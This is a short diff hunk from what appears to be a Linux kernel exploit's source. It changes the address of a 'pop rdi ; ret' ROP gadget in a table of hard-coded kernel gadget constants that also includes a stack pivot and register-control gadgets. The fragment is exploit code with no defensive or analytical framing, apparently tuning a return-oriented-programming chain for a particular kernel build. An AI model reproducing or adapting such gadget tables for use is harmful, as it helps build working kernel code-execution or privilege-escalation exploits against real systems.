@@ -58,7 +58,7 @@
 
 /* ROP gadgets */
 #define STACKPIVOT_GADGET_PTR		0xffffffff81c1349bUL /* mov esp, 0xf6000000 ; ret */
-#define POP_RDI				0xffffffff810862ccUL /* pop rdi ; ret */
+#define POP_RDI				0xffffffff81316d2fUL /* pop rdi ; ret */
 #define POP_RAX				0xffffffff810604c4UL /* pop rax ; ret */
 #define JMP_RAX				0xffffffff810372abUL /* jmp rax */
 #define PUSH_RAX_POP_RSI		0xffffffff81d1da58UL /* push rax ; pop rsi ; ret */
